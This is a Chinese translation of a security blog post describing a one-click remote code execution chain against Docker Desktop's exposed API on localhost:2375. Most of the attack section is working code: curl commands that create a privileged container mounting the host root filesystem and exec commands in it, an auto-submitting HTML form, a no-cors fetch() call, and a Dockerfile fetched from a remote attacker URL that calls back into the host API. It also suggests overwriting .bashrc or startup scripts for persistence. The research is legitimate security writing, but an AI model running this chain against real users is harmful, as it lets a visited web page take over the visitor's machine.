#  Docker API 漏洞利用实战：构建一键式远程代码执行（RCE）链   
m0z  securitainment   2025-02-04 05:37  
  
> 【翻译】Developing a Docker 1-Click RCE chain for fun  
  
  
在这篇博文中，我们将探讨滥用 Docker API 实现一键式 RCE 链的可能性。  
## 前言  
  
我想在开始之前强调，这个攻击链需要用户在其 Docker 设置中启用特定选项。默认安装是安全的，但如果你是 Docker 的常规用户，请确保禁用此选项，否则你将面临 RCE 风险。  
## Docker  
  
在开发 CTF 挑战时，我经常使用 Docker 来实现简单部署和安全保障。最近在进行 CTF 相关工作时，我偶然发现了以下 Docker 配置选项，这引起了我的注意。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPJmbMEyzx7Hqy9j7oACZsEHHAHiaf7tfxibphzwFLL0kd4YzCQQ6Ne2TaMu1yMzwnAImAVB3u2QUEQ/640?wx_fmt=png&from=appmsg "")  
  
Docker API 设置  
  
这个配置选项很简单：它会在端口 2375 上暴露"Docker API"。Docker 官方网站对这个 API 进行了描述。  
> Docker Engine API 是一个 RESTful API，可以通过 wget 或 curl 等 HTTP 客户端，或大多数现代编程语言中的 HTTP 库来访问。  
  
  
在撰写本文时，最新版本是 1.47，其端点文档可在  
这里  
查看。  
  
https://docs.docker.com/reference/api/engine/version/v1.47/  
  
这就引出了一个问题：为什么会有如此严格的警告？当然，访问此 API 允许你创建容器并执行代码。守护进程还使得提升到主机系统的权限成为可能。过去曾有多起针对暴露的 Docker API 的攻击案例，但这是由于 API 被暴露给外部世界。将其绑定到 localhost 应该是安全的，对吧？  
## 滥用 API  
  
如前所述，针对暴露的 Docker API 的攻击方式已经相当成熟。事实上，PayloadAllTheThings 上就有一个专门针对这种情况的漏洞利用脚本，可以在  
这里  
找到。  
  
上述漏洞利用脚本获取所有容器 ID，然后在其中运行特定命令。这对于概念验证来说很好，但还有很多未被探索的领域。如果没有容器怎么办？如何在主机环境中获得 root 访问权限？如果网络配置不允许回调怎么办？  
### 创建容器  
  
我们可以很容易地回答第一个问题。Docker API 定义了一个用于创建自己的容器的端点。利用这一点，我们可以简单地创建自己的容器。然后，为了提升权限，我们可以利用该端点的 HostConfig  
 选项，特别是 Binds  
 部分，它允许我们创建具有主机文件系统读写引用的容器。  
```
curl -X POST -H "Content-Type: application/json" -d '{"image": "alpine","Tty":true,"OpenStdin":true,"Privileged":true,"AutoRemove":true,"HostConfig":{"NetworkMode":"host","Binds":["/:/mnt"]}}' http://localhost:2375/containers/create?name=shell
```  
  
为了避免在 Windows 中挂载到 WSL，你可以定义一个挂载点到 C:/ 并访问 Windows 文件系统  
  
这将生成一个容器，该容器在容器内的 /mnt  
 目录下提供完整的主机文件系统访问权限，允许我们修改和读取这些文件。  
### 启动容器  
  
一旦容器创建完成，我们可以使用 /containers/<name>/start  
 端点来启动它。  
  
由于我们在前面的示例中传递了 ?name=shell  
 参数，我们已经将容器名称定义为 shell  
，所以我们可以直接使用它。  
```
curl -X POST http://localhost:2375/containers/shell/start
```  
### 执行命令  
  
在上面我们已经创建了一个挂载了主机文件系统的容器。为了进一步提升权限，我们需要覆写主机系统上的文件。  
  
Docker API 还提供了在我们新创建的容器中执行命令的方法。具体来说，就是 /containers/shell/exec  
 端点，它接受一个 Cmd  
 POST 参数并返回一个 exec_id  
，以及 /exec/<exec_id>/start  
 端点，允许我们运行命令。  
  
因此，我们可以使用类似 jq  
 这样的工具来解析第一个命令的输出，将其保存为环境变量，并在第二个命令中使用它来实现自动化。  
```
exec_id=$(curl -s -X POST -H "Content-Type: application/json" -d '{"AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Cmd":["mkdir", "/mnt/tmp/pwned"]}' http://localhost:2375/containers/shell/exec | jq -r .Id)curl -X POST "http://localhost:2375/exec/$exec_id/start" -H "Content-Type: application/json" -d '{"Detach": false, "Tty": false}'
```  
  
由于执行的命令是 mkdir /mnt/tmp/pwned  
，这将在主机文件系统的 /tmp  
 目录下创建一个名为 pwned  
 的目录。  
### 主机系统 Shell  
  
既然我们在主机系统上有任意写入权限，获取 shell 现在就变得相当简单了。上述概念验证仅创建了一个文件夹来证明我们具有写入权限。  
  
我不会花太多时间解释如何实现这一点，但其中一个选项是覆盖 root 用户的 .bashrc  
 文件并等待下次登录。在 Windows 上，你可以将批处理脚本写入 C:/Users/<user>/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/  
，该脚本将在下次登录时执行。  
  
另外，如果你想获得即时 shell，你也可以在 Linux 上覆盖 .so  
 文件或在 Windows 上覆盖 .dll  
 文件。我把这个留给读者作为练习。😂  
## 一键式 RCE  
  
到目前为止，你应该已经很好地理解了如何利用暴露的 Docker API。不过这给了我一个想法：既然这个服务运行在 localhost:2375  
 上，我们是否可以通过浏览器来滥用它？也就是说，我们能否找到一种方法来利用访问我们网站且在其本地主机上运行此服务的用户？  
### SOP  
  
这里的主要障碍之一是同源策略（Same-Origin Policy），它阻止网站与不同源的端点进行交互。有一些技巧可以绕过这个限制；重定向到 URL 通常不会被阻止。然而，Docker API 上大多数重要的端点都是 POST。  
  
另一个常见策略是定义一个 HTML 表单，其 action 指向远程资源，并使用 javascript 的 form.submit()  
 调用来提交。这将允许我们向 API 发送单个 POST 请求（以及 URL 参数）。问题是 API 似乎严格要求 application/json  
，而表单不支持这种格式。  
  
那么，我们能否找到一个端点，让我们仅使用 POST 原语就能完成所需的一切？  
### 镜像构建  
  
我尝试了多个不同的端点，最终发现了 /build  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPJmbMEyzx7Hqy9j7oACZsEia4aGKjGT3Vy2VLqVMdJBvMmLLQPeIjiazCHrha0fF5f7WwWTmBntY2Q/640?wx_fmt=png&from=appmsg "")  
  
build endpoint  
  
有趣的是，它接受 URL 参数。这里最有趣的是 remote  
 参数，它允许你指定一个远程 Dockerfile  
 的 URL，并且它会安装并运行构建。我在我的网站上构建了一个 HTML 表单并进行测试以验证其是否有效。  
```
<form action="http://localhost:2375/build?remote=https://<snip>/Dockerfile">  <input id="btn" type="submit"></form><script>document.getElementById("btn").click();</script>
```  
  
访问上述页面会将我的远程 Dockerfile 构建成镜像。  
### 滥用镜像构建  
  
事实证明，镜像构建是在它们自己的短生命周期容器中进行的。在这里，我们可以定义安装内容并运行任意命令。这让我想到了一种类似"盗梦空间"的攻击方式。我们是否可以再次使用 docker 镜像构建过程与 API 交互，但这次使用 curl 并设置 application/json  
 内容类型。  
  
答案是否定的...因为构建过程无法访问主机上的 localhost  
。这时我注意到了另一个可选参数。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPJmbMEyzx7Hqy9j7oACZsEY8d6IKTaxPqstO6VoMuIibcntbmu4gRceNmT2n4iaJ0lYqXOiccA9jsMA/640?wx_fmt=png&from=appmsg "")  
  
networkmode parameter  
  
啊哈！我们可以将 networkmode  
 设置为 host  
，这样通过引用 host.docker.internal  
 主机就可以与主机上的 localhost  
 进行交互。通过这种方式，我们可以创建一个 Dockerfile，它会创建一个挂载到主机的容器，运行命令来覆写主机文件，而这一切仅仅需要用户访问我们提交表单的网站即可完成。😱  
## 整合所有内容  
  
以下是我的 Dockerfile 漏洞利用代码。  
```
FROM alpine:latestRUN apk add --no-cache curl jqRUN curl -X POST -H "Content-Type: application/json" -d '{"image": "alpine","Tty":true,"OpenStdin":true,"Privileged":true,"AutoRemove":true,"HostConfig":{"NetworkMode":"host","Binds":["/:/mnt"]}}' http://host.docker.internal:2375/containers/create?name=shellRUN curl -X POST http://host.docker.internal:2375/containers/shell/startRUN exec_id=$(curl -s -X POST -H "Content-Type: application/json" -d '{"AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Cmd":["mkdir", "/mnt/tmp/pwned"]}' http://host.docker.internal:2375/containers/shell/exec | jq -r .Id) && curl -X POST "http://host.docker.internal:2375/exec/$exec_id/start" -H "Content-Type: application/json" -d '{"Detach": false, "Tty": false}'
```  
  
然后我们只需要一个网站来向 http://localhost:2375/build?remote=http://<snip>/Dockerfile&networkmode=host  
 发送 POST 请求即可执行。你可以使用上面的表单，或者直接运行以下 javascript 代码。  
```
fetch("http://127.0.0.1:2375/build?remote=https://<snip>/Dockerfile&networkmode=host", {method: "POST", mode: "no-cors"})
```  
  
我认为这里还有更多可以扩展的潜力。如果我们能够使用 GET 请求来构建镜像，那将成为一个有用的 SSRF -> RCE 利用工具链。  
  
我还想指出，在发布这篇文章之前，我做了一件负责任的事情 - 与 Docker Security 团队进行了确认。他们确实承认，如果你启用这个选项，那么确实会面临被攻击的风险。  
  
